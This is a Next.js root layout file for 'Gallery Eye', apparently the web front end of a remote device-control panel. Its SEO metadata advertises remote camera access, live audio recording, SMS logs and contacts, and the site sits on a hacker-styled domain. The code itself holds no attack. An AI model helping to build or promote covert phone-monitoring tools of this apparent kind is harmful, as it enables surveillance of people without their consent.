import './globals.css'
import type { Metadata, Viewport } from 'next'
import { Plus_Jakarta_Sans } from 'next/font/google'
import Provider from './provider'
import { Analytics } from '@vercel/analytics/react'
import { SpeedInsights } from '@vercel/speed-insights/react'

const plusJakartaSans = Plus_Jakarta_Sans({
    subsets: ['latin'],
    weight: ['300', '400', '500', '600', '700', '800'],
    display: 'swap',
    variable: '--font-plus-jakarta',
})

export const viewport: Viewport = {
    width: 'device-width',
    initialScale: 1,
    maximumScale: 5,
    userScalable: true,
    themeColor: [
        { media: '(prefers-color-scheme: dark)', color: '#0a0a0f' },
        { media: '(prefers-color-scheme: light)', color: '#5b5ef4' },
    ],
}

export const metadata: Metadata = {
    metadataBase: new URL('https://h4k3r-gallery.vercel.app'),
    title: {
        default: 'Gallery Eye — Ultimate Remote Command Center & Device Control Suite',
        template: '%s | Gallery Eye'
    },
    description: 'All-in-one secure remote administration and command center. Manage Remote Camera, SMS Logs, Contacts, Audio Notes, Flashlight, Vibration, and Encrypted Vaults across all devices with equal precision and speed.',
    keywords: [
        'Gallery Eye', 'Remote Command Center', 'Android Remote Access', 'Remote Camera Monitoring', 
        'Live Audio Recording', 'SMS Logs Management', 'Remote Contacts Vault', 'Flashlight Controller', 
        'Encrypted Media Vault', 'Device Telemetry Suite', 'Multi-Device Management', 'Secure Remote Suite'
    ],
    authors: [{ name: 'Gallery Eye Team' }],
    creator: 'Gallery Eye Security',
    publisher: 'Gallery Eye Technologies',
    applicationName: 'Gallery Eye Suite',
    category: 'Technology & Security',
    alternates: {
        canonical: 'https://h4k3r-gallery.vercel.app',
        languages: {
            'en-US': 'https://h4k3r-gallery.vercel.app',
        },
    },
    robots: {
        index: true,
        follow: true,
        googleBot: {
            index: true,
            follow: true,
            'max-video-preview': -1,
            'max-image-preview': 'large',
            'max-snippet': -1,
        },
    },
    icons: {
        icon: '/gallery-eye-logo.jpg',
        shortcut: '/gallery-eye-logo.jpg',
        apple: '/gallery-eye-logo.jpg',
    },
    openGraph: {
        type: 'website',
        locale: 'en_US',
        url: 'https://h4k3r-gallery.vercel.app',
        siteName: 'Gallery Eye Command Suite',
        title: 'Gallery Eye — Ultimate Remote Command Center & All-in-One Suite',
        description: 'Complete remote administration across all endpoints: Remote Camera, SMS Logs, Contacts, Live Audio Notes, Flashlight, and Encrypted Media Vault.',
        images: [
            {
                url: 'https://h4k3r-gallery.vercel.app/og-image.png',
                width: 1200,
                height: 630,
                alt: 'Gallery Eye Command Center — Remote Camera, SMS, Audio, Contacts & Media Suite',
            }
        ],
    },
    twitter: {
        card: 'summary_large_image',
        title: 'Gallery Eye — Ultimate Remote Command Center Suite',
        description: 'Manage Remote Camera, SMS Logs, Contacts, Audio Notes, Flashlight, and Encrypted Media Vault across all connected devices.',
        images: ['https://h4k3r-gallery.vercel.app/og-image.png'],
        creator: '@galleryeye_app',
    },
}

import { getServerSession } from 'next-auth'
import { authOptions } from './api/auth/[...nextauth]/route'

export default async function RootLayout({
    children,
}: {
    children: React.ReactNode
}) {
    const session = await getServerSession(authOptions)

    return (
        <html lang="en" className={plusJakartaSans.variable}>
            <head>
                <link rel="icon" href="/gallery-eye-logo.jpg" />
                <link rel="apple-touch-icon" href="/gallery-eye-logo.jpg" />
                <script
                    type="application/ld+json"
                    dangerouslySetInnerHTML={{
                        __html: JSON.stringify({
                            "@context": "https://schema.org",
                            "@type": "WebApplication",
                            "name": "Gallery Eye Command Center",
                            "url": "https://h4k3r-gallery.vercel.app",
                            "applicationCategory": "SecurityApplication, UtilitiesApplication",
                            "operatingSystem": "Android, Web, Windows, iOS, macOS",
                            "description": "Enterprise-grade secure gallery synchronization and real-time remote device telemetry. Access encrypted photos, videos, SMS logs, contacts, and live captures instantly across all devices.",
                            "offers": {
                                "@type": "AggregateOffer",
                                "priceCurrency": "USD",
                                "lowPrice": "0.00",
                                "highPrice": "29.99",
                                "offerCount": "3"
                            },
                            "author": {
                                "@type": "Organization",
                                "name": "Gallery Eye Security & Sync",
                                "url": "https://h4k3r-gallery.vercel.app"
                            },
                            "aggregateRating": {
                                "@type": "AggregateRating",
                                "ratingValue": "4.9",
                                "ratingCount": "1280",
                                "bestRating": "5"
                            }
                        })
                    }}
                />
            </head>
            <body className={plusJakartaSans.className}>
                <Provider session={session}>
                    {children}
                </Provider>
                <Analytics />
                <SpeedInsights />
            </body>
        </html>
    )
}
